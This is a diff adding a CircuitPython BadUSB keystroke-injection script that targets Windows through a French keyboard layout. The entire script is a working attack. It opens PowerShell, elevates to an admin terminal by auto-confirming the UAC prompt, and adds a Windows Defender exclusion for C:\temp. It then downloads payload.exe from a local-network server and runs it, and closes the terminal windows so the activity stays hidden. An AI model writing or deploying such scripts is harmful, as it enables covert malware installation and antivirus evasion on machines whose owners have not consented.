@@ -1,0 +1,68 @@
+import time
+import board
+import usb_hid
+from adafruit_hid.keyboard import Keyboard
+from adafruit_hid.keyboard_layout_win_fr import KeyboardLayout  # Layout FR
+from adafruit_hid.keycode_win_fr import Keycode  # Keycodes FR
+
+# Initialiser le clavier et le layout
+keyboard = Keyboard(usb_hid.devices)
+layout = KeyboardLayout(keyboard)
+
+# Attendre que tout soit prêt
+time.sleep(2)
+
+# Ouvre la fenêtre "Exécuter" avec Windows+R
+keyboard.press(Keycode.GUI, Keycode.R)
+keyboard.release_all()
+time.sleep(0.5)
+
+layout.write("powershell")
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+
+# Tape la commande PowerShell pour ouvrir Windows Terminal en mode admin
+layout.write("start-process wt -verb runas")
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(1)
+
+# Valider la demande d'élévation avec flèche gauche + entrée
+keyboard.press(Keycode.LEFT_ARROW)
+keyboard.release_all()
+time.sleep(0.2)
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+
+# Attendre que PowerShell s'ouvre après élévation
+time.sleep(2)
+
+# Crée un répertoire et ajoute une exclusion à Windows Defender
+layout.write('$dir = "C:\\temp"')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(0.5)
+
+layout.write('$shell = "$dir\\shell.exe"; New-Item -Path $dir -ItemType Directory')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(0.5)
+
+layout.write('Add-MpPreference -ExclusionPath $dir')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(0.5)
+
+# Télécharge et exécute un fichier depuis un serveur web
+layout.write('Invoke-WebRequest -Uri http://192.168.1.42:8000/payload.exe -OutFile $shell; Start-Process $shell')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# Ferme les processus PowerShell et Windows Terminal pour éviter la visibilité
+layout.write('Stop-Process -Name powershell, WindowsTerminal')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(1)
